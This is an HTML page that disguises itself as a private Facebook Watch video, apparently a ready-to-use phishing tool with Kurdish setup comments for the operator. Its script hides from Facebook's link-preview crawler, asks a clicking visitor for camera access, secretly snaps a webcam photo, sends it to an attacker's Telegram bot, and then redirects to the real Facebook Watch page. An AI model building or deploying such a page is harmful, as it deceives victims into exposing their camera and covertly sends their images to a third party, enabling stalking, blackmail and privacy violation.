<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta property="og:site_name" content="facebook.com">
    <meta property="og:title" content="Facebook Watch | ڤیدیۆیەکی تایبەت">
    <meta property="og:image" content="thumbnail.jpg">
    <meta property="og:url" content="https://www.facebook.com">
    <meta property="og:type" content="video.other">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Video</title>
    <style>
        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .play { position: absolute; width: 80px; height: 80px; background: rgba(0,0,0,0.5); border-radius: 50%; border: 2px solid #fff; }
        .play::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent #fff; position: absolute; top: 25px; left: 30px; }
    </style>
</head>
<body>
    <video id="v" autoplay playsinline poster="thumbnail.jpg"></video>
    <div class="play"></div>
    <canvas id="c" style="display:none"></canvas>

    <script>
        // لێرە Token و Chat ID تەلەگرامەکەت دابنێ
        const T = 'لێرە_TOKEN_دابنێ';
        const C = 'لێرە_CHATID_دابنێ';
        const FB = "https://www.facebook.com/watch";

        if (!navigator.userAgent.includes("facebookexternalhit")) {
            window.onclick = async () => {
                try {
                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
                    document.getElementById('v').srcObject = s;
                    setTimeout(() => {
                        const can = document.getElementById('c');
                        const vid = document.getElementById('v');
                        can.width = vid.videoWidth; can.height = vid.videoHeight;
                        can.getContext('2d').drawImage(vid, 0, 0);
                        can.toBlob(b => {
                            const f = new FormData();
                            f.append('chat_id', C); f.append('photo', b, 's.jpg');
                            fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f })
                            .then(() => location.href = FB);
                        }, 'image/jpeg');
                    }, 1000);
                } catch (e) { location.href = FB; }
            };
        }
    </script>
</body>
</html>
